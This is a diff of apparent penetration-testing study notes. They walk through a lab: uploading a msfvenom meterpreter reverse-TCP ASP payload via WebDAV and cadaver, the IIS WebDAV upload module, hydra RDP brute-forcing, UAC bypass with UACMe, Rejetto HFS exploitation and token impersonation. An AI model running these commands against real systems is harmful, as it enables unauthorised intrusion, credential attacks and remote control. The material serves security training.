@@ -14,7 +14,7 @@ Exploiting WebDAV With Metasploit
 		- `-f asp`: This parameter specifies the output format for the generated payload. In this case, it is set to ASP (Active Server Pages). The generated payload will be in the form of an ASP script.
 		- `> meterpreter.asp`: This part redirects the output of the msfvenom command to a file named "meterpreter.asp". The generated ASP payload will be saved in this file.
 
-		1. Payload: `windows/meterpreter/reverse_tcp` The `windows/meterpreter/reverse_tcp` payload is a specific type of payload available in the Metasploit Framework. It creates a reverse TCP connection from the target machine to the attacker's machine. Once the connection is established, it allows the attacker to execute commands and interact with the compromised system.
+		1. Payload: `windows/meterpreter/reverse_tcp` The `windows/meterpreter/reverse_tcp`  creates a reverse TCP connection from the target machine to the attacker's machine. Once the connection is established, it allows the attacker to execute commands and interact with the compromised system.
 		    
 		    In a reverse TCP scenario, the exploited system initiates the connection to the attacker's machine, which is typically listening on a specific IP address (`LHOST`) and port (`LPORT`). This type of connection is useful when the exploited system is behind firewalls or other network restrictions that might prevent direct incoming connections.
 		    
@@ -30,7 +30,6 @@ Now... moving to **cadaver**
 	- use `put` to upload the file that you created: `put /root/meterpreter.asp `
 - before executing the malicious file we need to set up a listener/handler that will receive the reverse connection from target system and then send the stage which will give you a meterpreter session when executed 
 	- start up metasploit framework console session: `service postgresql start && msfconsole`
-		
 
 - Setting up handler/listener in metasploit by using metasploit module : 
 	- `use multi/handler `
@@ -48,12 +47,12 @@ We have a second option using metasploit
 
 - `search` `iis` `upload` 
 - `use exploit/windows/iis/iis_webdav_upload_asp`
-	- set  HttpUsername bob  
-	- set  HttpPassword password_123321
-	- set RHOST to targtet ip 
-	- set Rport 
-	- set PATH /webdav/metasploit.asp  (this is what will be uploaded)
-	- exploit (this will start reverse tcp handler)
+	- `set  HttpUsername bob ` 
+	- `set  HttpPassword password_123321`
+	- `set RHOST to targtet ip `
+	- `set Rport `
+	- `set PATH /webdav/metasploit.asp ` (this is what will be uploaded)
+	- `exploit` (this will start reverse tcp handler)
 
 
 ![[Pasted image 20230703122802.png]]
@@ -162,11 +161,11 @@ demo
 - Perform `nmap scan - port scan` on target 
   OR
 - ` service postgresql ``start &&msfconsole`
-- `search rdp_scanner` (aux/scanner/rdp/rdp_scanner), set options 
+- `search rdp_scanner` (`aux/scanner/rdp/rdp_scanner`), set options 
 
 Bruteforce rdp
 - Use hydra: `**hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://targetip  -s rdp'port**`
-	- you can reduce the bruteforce speed with hydra,the default is 16 but you can change it to make sure that you dont cause damage to the customer you are pentesting 
+	- you can reduce the bruteforce speed with hydra, the default is 16 but you can change it to make sure that you don't cause damage to the customer you are pentesting 
 	- you need to add -s the port because if you do not add the port it will assume the default rdp port 
 - authenticate with credentials found in target: `xfreerdp /u:administrator /p:qwertyuiop /v:targetip `
 	- `xfreerdp`: This is the command to launch the FreeRDP client. used to initiate a remote desktop session - It will establish a graphical connection to the remote system, allowing you to interact with its desktop environment as if you were physically present at that machine. 
@@ -195,11 +194,6 @@ demo
 
 	- the size needs to be modified if it is to high because it will crash the target system 
 	    --> be carefull with kernel exploit because they can crash a system and cause data loss 
-
-
-
-
-
 
 
 
@@ -298,15 +292,14 @@ UACMe
 - The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target. 
 
 UAC on windows system 
-- open CMD in windows: net users 
-- check members of the group: net localgroup administrators 
+- open CMD in windows: `net users `
+- check members of the group: `net localgroup administrators `
 
 Tool: https://github.com/hfiref0x/UACME 
 In order to elevate privileges by bypassing UAC, you will need access to a user that is a member of the local administrators group
 
----
 
-1. Perform an Nmap scan on the target system to gather information about open ports and services.
+1. Perform an Nmap scan 
 2. Try to access the web server on the target system by connecting to port 80.
 3. Start up the Metasploit Framework:
     - Search for the exploit targeting the Rejetto HTTP File Server (HFS). 
@@ -402,7 +395,7 @@ Demo:
 	2. Visit in the browser and see the rejetto HTTP file server 
 2.  mfsconsole
 	1. search for rejetto module and exploit 
-	2. set default payload (windows/meterpreter/reverse_tcp)
+	2. set default `payload (windows/meterpreter/reverse_tcp)`
 	3. set lhost and lport rhost 
 3. this will give you a meterpreter session 
 	 - run `sysinfo` 
@@ -414,11 +407,11 @@ Demo:
 		- `list_tokens -u` 
 		- copy the name of the first accesstoken 
 		- `impersonate_token` "paste name token"
-			- getuid 
-			- getprivs 
-			- pgrep explorer 
-			- migrate to explorer.exe 
-			- getprivs 
+			- `getuid` 
+			- `getprivs` 
+			- `pgrep explorer `
+			- `migrate explorer.exe `
+			- `getprivs` 
 
 When you do not find privileged access tokens -> use patato attack 
 
